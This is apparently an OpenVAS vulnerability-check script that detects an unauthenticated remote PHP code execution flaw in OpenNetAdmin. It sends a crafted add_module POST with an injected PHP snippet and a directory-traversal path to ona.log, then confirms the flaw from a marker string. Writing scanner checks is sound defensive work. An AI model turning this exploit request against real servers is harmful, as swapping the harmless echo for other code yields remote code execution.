###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_opennetadmin_61004.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# OpenNetAdmin 'ona.log' File Remote PHP Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103760");
  script_bugtraq_id(61004);
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");
  script_version("$Revision: 13994 $");
  script_name("OpenNetAdmin 'ona.log' File Remote PHP Code Execution Vulnerability");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61004");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2013-08-13 15:18:42 +0200 (Tue, 13 Aug 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"An attacker can exploit this issue to inject and execute arbitrary PHP
  code in the context of the affected application. This may facilitate a compromise of the application and
  the underlying system. Other attacks are also possible.");

  script_tag(name:"vuldetect", value:"This NVT add a new module to execute some php code by sending some HTTP requests to the target.");

  script_tag(name:"insight", value:"This problem exist because adding modules can be done without any sort
  of authentication.");

  script_tag(name:"solution", value:"Ask the Vendor for an update.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"OpenNetAdmin is prone to a remote PHP code-execution vulnerability.");

  script_tag(name:"affected", value:"OpenNetAdmin 13.03.01 is vulnerable, other versions may also be
  affected.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) )
  exit( 0 );

foreach dir( make_list_unique( "/ona", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/";
  buf = http_get_cache( item:url, port:port );

  if( buf && "<title>OpenNetAdmin ::" >< buf ) {
    install = dir;
    break;
  }
}

if( ! install )
  exit( 0 );

host = http_host_name( port:port );

vtstrings = get_vt_strings();
check = vtstrings["lowercase_rand"] + '_' + unixtime();
mod_name = vtstrings["lowercase_rand"] + '_' + unixtime();

ex = 'options%5Bdesc%5D=%3C%3Fphp+echo+%27' + check  + '%27+%3F%3E&module=add_module&options%5Bname%5D=' + mod_name + '&options%5Bfile%5D=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fona.log';

req = 'POST ' + dir + '/dcm.php HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'Connection: close\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
      'Content-Length: ' + strlen(ex) + '\r\n' +
      '\r\n' + ex;
result = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( "Module ADDED" >!< result || check >!< result )
  exit( 99 );

url = dir + '/dcm.php?module=' + mod_name;
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( check >< buf ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );